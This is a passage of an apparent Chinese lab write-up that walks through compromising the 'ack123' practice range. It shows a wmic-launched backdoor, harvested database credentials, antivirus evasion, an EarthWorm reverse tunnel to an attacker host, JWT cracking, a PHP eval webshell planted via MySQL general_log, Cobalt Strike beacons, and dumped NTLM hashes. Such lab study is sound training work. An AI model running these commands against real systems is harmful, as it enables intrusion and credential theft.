13004 暂缺                                        </span><br><span class="line">cmd.exe                      11288 暂缺                                        </span><br><span class="line">conhost.exe                  12244 暂缺                                        </span><br><span class="line">cmd.exe                      15096 暂缺                                        </span><br><span class="line">conhost.exe                  15036 暂缺                                        </span><br><span class="line">cmd.exe                      14772 暂缺                                        </span><br><span class="line">conhost.exe                  14568 暂缺                                        </span><br><span class="line">cmd.exe                      13528 暂缺                                        </span><br><span class="line">conhost.exe                  14368 暂缺                                        </span><br><span class="line">360Tray.exe                  15796 暂缺                                        </span><br><span class="line">ZhuDongFangYu.exe            15692 ZhuDongFangYu                               </span><br><span class="line">SoftMgrLite.exe               4988 暂缺                                        </span><br><span class="line">360speedld.exe                6616 暂缺                                        </span><br><span class="line">cmd.exe                      11872 暂缺                                        </span><br><span class="line">conhost.exe                   9948 暂缺                                        </span><br><span class="line">tasklist.exe                  1688 暂缺</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/14.png" alt></p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><ul>
+<li>上传后门到服务器</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/c wmic /node:127.0.0.1 process call create "C:\Windows\Temp\ma\1.exe'</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/15.png" alt></p>
+<ul>
+<li>提权 &amp;&amp; ok</li>
+</ul>
+<p><img data-src="./ack123/16.png" alt></p>
+<p><img data-src="./ack123/17.png" alt></p>
+<h3 id="站库分离data1"><a href="#站库分离data1" class="headerlink" title="站库分离data1"></a>站库分离data1</h3><h4 id="敏感信息-amp-amp-权限"><a href="#敏感信息-amp-amp-权限" class="headerlink" title="敏感信息&amp;&amp;权限"></a>敏感信息&amp;&amp;权限</h4><ul>
+<li>上文暴露的web页面存在敏感信息，查看web配置文件可以发现</li>
+</ul>
+<p><img data-src="./ack123/18.png" alt></p>
+<p><img data-src="./ack123/19.png" alt></p>
+<ul>
+<li>敏感信息如下，也能进一步确认是个站库分离的，无法直接访问到22网段</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;add key="HdhCmsConnStr" value="user id=sa;password=pass123@.com;initial catalog=DemoHdhCms;data source=192.168.22.133"/&gt;</span><br><span class="line"></span><br><span class="line">sa pass123@.com 192.168.22.133</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过web侧大马进行数据库连接</li>
+</ul>
+<p><img data-src="./ack123/20.png" alt></p>
+<p><img data-src="./ack123/21.png" alt></p>
+<ul>
+<li>拿到数据库普通用户权限</li>
+</ul>
+<p><img data-src="./ack123/22.png" alt></p>
+<p><img data-src="./ack123/23.png" alt></p>
+<ul>
+<li><code>tasklist /svc</code> 查看杀软</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">映像名称 PID 服务</span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process 0 暂缺</span><br><span class="line">System 4 暂缺</span><br><span class="line">smss.exe 244 暂缺</span><br><span class="line">csrss.exe 352 暂缺</span><br><span class="line">wininit.exe 444 暂缺</span><br><span class="line">csrss.exe 452 暂缺</span><br><span class="line">winlogon.exe 480 暂缺</span><br><span class="line">services.exe 536 暂缺</span><br><span class="line">lsass.exe 544 SamSs</span><br><span class="line">svchost.exe 600 BrokerInfrastructure, DcomLaunch, LSM,</span><br><span class="line">PlugPlay, Power, SystemEventsBroker</span><br><span class="line">svchost.exe 628 RpcEptMapper, RpcSs</span><br><span class="line">dwm.exe 712 暂缺</span><br><span class="line">svchost.exe 828 Dhcp, EventLog, lmhosts, Wcmsvc</span><br><span class="line">svchost.exe 924 gpsvc, IKEEXT, iphlpsvc, LanmanServer,</span><br><span class="line">ProfSvc, Schedule, SENS, ShellHWDetection,</span><br><span class="line">Themes, Winmgmt</span><br><span class="line">svchost.exe 1008 EventSystem, FontCache, netprofm, nsi,</span><br><span class="line">W32Time</span><br><span class="line">svchost.exe 360 CryptSvc, Dnscache, LanmanWorkstation,</span><br><span class="line">NlaSvc, WinRM</span><br><span class="line">svchost.exe 612 BFE, DPS, MpsSvc</span><br><span class="line">spoolsv.exe 1204 Spooler</span><br><span class="line">svchost.exe 1244 DiagTrack</span><br><span class="line">MsDtsSrvr.exe 1284 MsDtsServer110</span><br><span class="line">sqlservr.exe 1388 MSSQLSERVER</span><br><span class="line">msmdsrv.exe 1404 MSSQLServerOLAPService</span><br><span class="line">Service_KMS.exe 1612 Service KMSELDI</span><br><span class="line">sqlwriter.exe 1668 SQLWriter</span><br><span class="line">svchost.exe 1704 TrkWks, UALSVC</span><br><span class="line">VGAuthService.exe 1764 VGAuthService</span><br><span class="line">vmtoolsd.exe 1816 VMTools</span><br><span class="line">WmiPrvSE.exe 2120 暂缺</span><br><span class="line">fdlauncher.exe 2356 MSSQLFDLauncher</span><br><span class="line">svchost.exe 2408 PolicyAgent</span><br><span class="line">dllhost.exe 2576 COMSysApp</span><br><span class="line">msdtc.exe 2736 MSDTC</span><br><span class="line">fdhost.exe 2872 暂缺</span><br><span class="line">conhost.exe 2880 暂缺</span><br><span class="line">taskhostex.exe 304 暂缺</span><br><span class="line">explorer.exe 1060 暂缺</span><br><span class="line">ChsIME.exe 1756 暂缺</span><br><span class="line">vm3dservice.exe 1396 暂缺</span><br><span class="line">vmtoolsd.exe 1172 暂缺</span><br><span class="line">powershell.exe 1652 暂缺</span><br><span class="line">conhost.exe 1780 暂缺</span><br><span class="line">HipsTray.exe 3088 暂缺</span><br><span class="line">HipsDaemon.exe 3084 HipsDaemon</span><br><span class="line">usysdiag.exe 1472 暂缺</span><br><span class="line">HipsMain.exe 3664 暂缺</span><br><span class="line">cmd.exe 896 暂缺</span><br><span class="line">conhost.exe 4048 暂缺</span><br><span class="line">tasklist.exe 2644 暂缺</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/24.png" alt></p>
+<ul>
+<li>存在火绒，我们cs拿到shell需要进行一定的免杀</li>
+<li>emm，免杀这个东西，还是要藏得，靶场通外网，我们就设置白名单说明下</li>
+<li>下面给出免杀的一个效果，有师傅需要可以call me</li>
+</ul>
+<p><img data-src="./ack123/25.png" alt></p>
+<p><img data-src="./ack123/26.png" alt></p>
+<p><img data-src="./ack123/27.png" alt></p>
+<p><img data-src="./ack123/28.png" alt></p>
+<p>这里360 and 火绒过，windows defender 挂掉了 好几个月的了</p>
+<p>稍微修改下</p>
+<p><img data-src="./ack123/29.png" alt></p>
+<p><img data-src="./ack123/30.png" alt></p>
+<p>ok 拿下</p>
+<ul>
+<li>上传后门到data1服务器</li>
+</ul>
+<p><img data-src="./ack123/31.png" alt></p>
+<ul>
+<li>执行<code>C:\Windows\Temp\ma\1.exe</code></li>
+</ul>
+<p><img data-src="./ack123/32.png" alt></p>
+<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><ul>
+<li>烂土豆提权 </li>
+</ul>
+<p><img data-src="./ack123/33.png" alt></p>
+<p><img data-src="./ack123/34.png" alt></p>
+<p>拿到data1的flag</p>
+<p><img data-src="./ack123/35.png" alt></p>
+<h4 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h4><ul>
+<li>内网探测80端口</li>
+</ul>
+<p><img data-src="./ack123/36.png" alt></p>
+<p><img data-src="./ack123/37.png" alt></p>
+<ul>
+<li>其中135为web2</li>
+</ul>
+<h4 id="内网隧道"><a href="#内网隧道" class="headerlink" title="内网隧道"></a>内网隧道</h4><ul>
+<li>设置代理，这里利用ew</li>
+<li>不过需要做一下火绒免杀</li>
+</ul>
+<p><img data-src="./ack123/38.png" alt></p>
+<ul>
+<li>这里比较简单，只需要upx加壳即可</li>
+</ul>
+<p><img data-src="./ack123/39.png" alt></p>
+<p><img data-src="./ack123/40.png" alt></p>
+<p><img data-src="./ack123/41.png" alt></p>
+<ul>
+<li>因为是内网环境，我们将自己的kali假设为公网服务器</li>
+</ul>
+<p><img data-src="./ack123/42.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 10000 -e 11000</span><br><span class="line"></span><br><span class="line">shell C:\Windows\Temp\ew_for_Win.exe -s rssocks -d 192.168.59.138 -e 11000</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="内网web2服务"><a href="#内网web2服务" class="headerlink" title="内网web2服务"></a>内网web2服务</h3><p><img data-src="./ack123/43.png" alt></p>
+<ul>
+<li>查看<code>jwt_token</code></li>
+</ul>
+<p><img data-src="./ack123/44.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC8xMC4xMC4xLjEzNSIsImF1ZCI6Imh0dHA6XC9cLzEwLjEwLjEuMTM1IiwiaWF0IjoxNjQ4MzAyOTAwLCJuYmYiOjE2NDgzMDI5MTAsImV4cCI6MTY0ODMwMzUwMCwiZGF0YSI6eyJ1c2VyaWQiOjEsInVzZXJuYW1lIjoiZGVtbyJ9fQ.Ldg32GIp9CtI_6eU2e8Y2wLN4FCvmhLHXCJxCeAebDM</span><br></pre></td></tr></table></figure>
+
+<h4 id="hachcat破解jwt-token"><a href="#hachcat破解jwt-token" class="headerlink" title="hachcat破解jwt_token"></a>hachcat破解jwt_token</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 16500 jwt -a 3  /usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Qweasdzxc5</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/45.png" alt></p>
+<h4 id="phpMyAdmin拿到shell"><a href="#phpMyAdmin拿到shell" class="headerlink" title="phpMyAdmin拿到shell"></a>phpMyAdmin拿到shell</h4><ul>
+<li>搜索发现可能是 <code>phpstudy v8.1</code> 本地测试访问phpmyadmin目录</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.22.135/phpMyAdmin4.8.5/</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/46.png" alt></p>
+<ul>
+<li>账号密码为 <code>root / Qweasdzxc5</code></li>
+</ul>
+<p><img data-src="./ack123/47.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">show variables  like  '%general%';</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 打开general_log日志读写功能</span></span><br><span class="line">SET GLOBAL general_log='on'</span><br><span class="line"></span><br><span class="line">SET GLOBAL general_log_file='C:/phpstudy_pro/WWW/shell.php'</span><br><span class="line"></span><br><span class="line">SELECT '&lt;?php @eval($_POST[laotie233]);?&gt;'</span><br></pre></td></tr></table></figure>
+
+<p><img data-src="./ack123/48.png" alt></p>
+<ul>
+<li>写入<code>shell</code>, 使用antsword连接，设置代理</li>
+</ul>
+<p><img data-src="./ack123/49.png" alt></p>
+<p><img data-src="./ack123/50.png" alt></p>
+<p>此处系统权限最高，无需提权</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">C:\phpstudy_pro\WWW&gt; tasklist /svc</span><br><span class="line">ӳ������                       PID ����                                        </span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process              0 ��ȱ                                        </span><br><span class="line">System                           4 ��ȱ                                        </span><br><span class="line">smss.exe                       216 ��ȱ                                        </span><br><span class="line">csrss.exe                      312 ��ȱ                                        </span><br><span class="line">wininit.exe                    404 ��ȱ                                        </span><br><span class="line">csrss.exe                      412 ��ȱ                                        </span><br><span class="line">winlogon.exe                   440 ��ȱ                                        </span><br><span class="line">services.exe                   500 ��ȱ                                        </span><br><span class="line">lsass.exe                      508 Netlogon, SamSs                             </span><br><span class="line">svchost.exe                    564 BrokerInfrastructure, DcomLaunch, LSM,      </span><br><span class="line">                                   PlugPlay, Power, SystemEventsBroker         </span><br><span class="line">svchost.exe                    592 RpcEptMapper, RpcSs                         </span><br><span class="line">svchost.exe                    700 Dhcp, EventLog, lmhosts, Wcmsvc             </span><br><span class="line">dwm.exe                        708 ��ȱ                                        </span><br><span class="line">svchost.exe                    736 CertPropSvc, DsmSvc, gpsvc, IKEEXT,         </span><br><span class="line">                                   iphlpsvc, LanmanServer, ProfSvc, Schedule,  </span><br><span class="line">                                   SENS, SessionEnv, ShellHWDetection, Themes, </span><br><span class="line">                                   Winmgmt                                     </span><br><span class="line">svchost.exe                    844 EventSystem, FontCache, netprofm, nsi,      </span><br><span class="line">                                   W32Time                                     </span><br><span class="line">svchost.exe                    908 CryptSvc, Dnscache, LanmanWorkstation,      </span><br><span class="line">                                   NlaSvc, WinRM                               </span><br><span class="line">svchost.exe                    284 BFE, DPS, MpsSvc                            </span><br><span class="line">spoolsv.exe                   1064 Spooler                                     </span><br><span class="line">svchost.exe                   1092 DiagTrack                                   </span><br><span class="line">phpStudyServer.exe            1124 phpStudySrv                                 </span><br><span class="line">Service_KMS.exe               1212 Service KMSELDI                             </span><br><span class="line">httpd.exe                     1244 ��ȱ                                        </span><br><span class="line">mysqld.exe                    1252 ��ȱ                                        </span><br><span class="line">conhost.exe                   1264 ��ȱ                                        </span><br><span class="line">svchost.exe                   1316 Netman, TrkWks, UALSVC, UmRdpService        </span><br><span class="line">httpd.exe                     1380 ��ȱ                                        </span><br><span class="line">VGAuthService.exe             5496 VGAuthService                               </span><br><span class="line">vmtoolsd.exe                  5548 VMTools                                     </span><br><span class="line">svchost.exe                   5796 TermService                                 </span><br><span class="line">WmiPrvSE.exe                  6024 ��ȱ                                        </span><br><span class="line">svchost.exe                   6284 PolicyAgent                                 </span><br><span class="line">dllhost.exe                   6580 COMSysApp                                   </span><br><span class="line">msdtc.exe                     6688 MSDTC                                       </span><br><span class="line">taskhostex.exe                6568 ��ȱ                                        </span><br><span class="line">ChsIME.exe                     252 ��ȱ                                        </span><br><span class="line">explorer.exe                  6792 ��ȱ                                        </span><br><span class="line">vm3dservice.exe                572 ��ȱ                                        </span><br><span class="line">vmtoolsd.exe                   968 ��ȱ                                        </span><br><span class="line">powershell.exe                6096 ��ȱ                                        </span><br><span class="line">conhost.exe                    548 ��ȱ                                        </span><br><span class="line">LogonUI.exe                   7128 ��ȱ                                        </span><br><span class="line">ChsIME.exe                    7152 ��ȱ                                        </span><br><span class="line">php-cgi.exe                   6444 ��ȱ                                        </span><br><span class="line">cmd.exe                       7964 ��ȱ                                        </span><br><span class="line">conhost.exe                   7216 ��ȱ                                        </span><br><span class="line">cmd.exe                       7080 ��ȱ                                        </span><br><span class="line">tasklist.exe                  7444 ��ȱ</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>无杀软</li>
+</ul>
+<p><img data-src="./ack123/51.png" alt></p>
+<ul>
+<li>设置转发上线，到cs上</li>
+</ul>
+<p><img data-src="./ack123/52.png" alt></p>
+<p><img data-src="./ack123/53.png" alt></p>
+<ul>
+<li>这里只能生成无状态的stager</li>
+</ul>
+<p><img data-src="./ack123/54.png" alt></p>
+<ul>
+<li>上传木马</li>
+</ul>
+<p><img data-src="./ack123/55.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Windows/Temp/beacon123.exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>成功上线</li>
+</ul>
+<p><img data-src="./ack123/56.png" alt></p>
+<p><img data-src="./ack123/57.png" alt></p>
+<h4 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h4><ul>
+<li>在域内</li>
+</ul>
+<p><img data-src="./ack123/58.png" alt></p>
+<p><img data-src="./ack123/59.png" alt></p>
+<ul>
+<li>spn扫描</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">shell setspn -T ack123.com -q */*</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"><span class="meta">beacon&gt;</span><span class="bash"> shell setspn -T ack123.com -q */*</span></span><br><span class="line">[+] established link to parent beacon: 192.168.59.130</span><br><span class="line">[*] Tasked beacon to sleep for 30s (30% jitter) [change made to: Beacon 192.168.59.130@3752]</span><br><span class="line">[-] lost link to parent beacon: 192.168.59.130</span><br><span class="line">[*] Tasked beacon to run: setspn -T ack123.com -q */*</span><br><span class="line">[+] host called home, sent: 58 bytes</span><br><span class="line">[+] established link to parent beacon: 192.168.59.130</span><br><span class="line">[+] received output:</span><br><span class="line">正在检查域 DC=ack123,DC=com</span><br><span class="line">CN=Administrator,CN=Users,DC=ack123,DC=com</span><br><span class="line">	mysql/16server-dc1.ack123.com</span><br><span class="line">CN=16SERVER-DC1,OU=Domain Controllers,DC=ack123,DC=com</span><br><span class="line">	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/16server-dc1.ack123.com</span><br><span class="line">	ldap/16server-dc1.ack123.com/ForestDnsZones.ack123.com</span><br><span class="line">	ldap/16server-dc1.ack123.com/DomainDnsZones.ack123.com</span><br><span class="line">	DNS/16server-dc1.ack123.com</span><br><span class="line">	GC/16server-dc1.ack123.com/ack123.com</span><br><span class="line">	RestrictedKrbHost/16server-dc1.ack123.com</span><br><span class="line">	RestrictedKrbHost/16SERVER-DC1</span><br><span class="line">	RPC/fc2c7a98-defb-4143-8052-ec1832c2a8f0._msdcs.ack123.com</span><br><span class="line">	HOST/16SERVER-DC1/ACK123</span><br><span class="line">	HOST/16server-dc1.ack123.com/ACK123</span><br><span class="line">	HOST/16SERVER-DC1</span><br><span class="line">	HOST/16server-dc1.ack123.com</span><br><span class="line">	HOST/16server-dc1.ack123.com/ack123.com</span><br><span class="line">	E3514235-4B06-11D1-AB04-00C04FC2DCD2/fc2c7a98-defb-4143-8052-ec1832c2a8f0/ack123.com</span><br><span class="line">	ldap/16SERVER-DC1/ACK123</span><br><span class="line">	ldap/fc2c7a98-defb-4143-8052-ec1832c2a8f0._msdcs.ack123.com</span><br><span class="line">	ldap/16server-dc1.ack123.com/ACK123</span><br><span class="line">	ldap/16SERVER-DC1</span><br><span class="line">	ldap/16server-dc1.ack123.com</span><br><span class="line">	ldap/16server-dc1.ack123.com/ack123.com</span><br><span class="line">CN=krbtgt,CN=Users,DC=ack123,DC=com</span><br><span class="line">	kadmin/changepw</span><br><span class="line">CN=12SERVER-DATA2,CN=Computers,DC=ack123,DC=com</span><br><span class="line">	WSMAN/12server-data2</span><br><span class="line">	WSMAN/12server-data2.ack123.com</span><br><span class="line">	RestrictedKrbHost/12SERVER-DATA2</span><br><span class="line">	HOST/12SERVER-DATA2</span><br><span class="line">	RestrictedKrbHost/12server-data2.ack123.com</span><br><span class="line">	HOST/12server-data2.ack123.com</span><br><span class="line">CN=12SERVER-WEB2,CN=Computers,DC=ack123,DC=com</span><br><span class="line">	TERMSRV/12SERVER-WEB2</span><br><span class="line">	TERMSRV/12server-web2.ack123.com</span><br><span class="line">	WSMAN/12server-web2</span><br><span class="line">	WSMAN/12server-web2.ack123.com</span><br><span class="line">	RestrictedKrbHost/12SERVER-WEB2</span><br><span class="line">	HOST/12SERVER-WEB2</span><br><span class="line">	RestrictedKrbHost/12server-web2.ack123.com</span><br><span class="line">	HOST/12server-web2.ack123.com</span><br><span class="line"></span><br><span class="line">发现存在 SPN!</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看凭证</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">[*] Tasked beacon to dump hashes</span><br><span class="line">[+] host called home, sent: 82501 bytes</span><br><span class="line">[+] received password hashes:</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:b78ee36a79ed9763b66519f86825a6bd:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">moonsec:1001:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 337100 (00000000:000524cc)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : web2</span><br><span class="line">Domain            : ACK123</span><br><span class="line">Logon Server      : 16SERVER-DC1</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:32:45</span><br><span class="line">SID               : S-1-5-21-2015848930-1301831522-615504165-1104</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : web2</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * NTLM     : 85b998a3d8f1904bc6f2d6b5f418be7e</span><br><span class="line">	 * SHA1     : 09b436459c1e57b9fe5af3ae1d04847a444df556</span><br><span class="line">	 [00010000] CredentialKeys</span><br><span class="line">	 * NTLM     : 85b998a3d8f1904bc6f2d6b5f418be7e</span><br><span class="line">	 * SHA1     : 09b436459c1e57b9fe5af3ae1d04847a444df556</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : web2</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : web2</span><br><span class="line">	 * Domain   : ACK123.COM</span><br><span class="line">	 * Password : (null)</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : 12SERVER-WEB2$</span><br><span class="line">Domain            : ACK123</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022&#x2F;3&#x2F;7 22:30:53</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : 12SERVER-WEB2$</span><br><span class="line">	 * Domain   : ACK123</span><br><span class="line">	 * NTLM     : 69478339633f30c7da5a2d2da43dc45c</span><br><span class="line">	 * SHA1     : d66cf9670ed5b1daf954aefa5648c632440784af</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	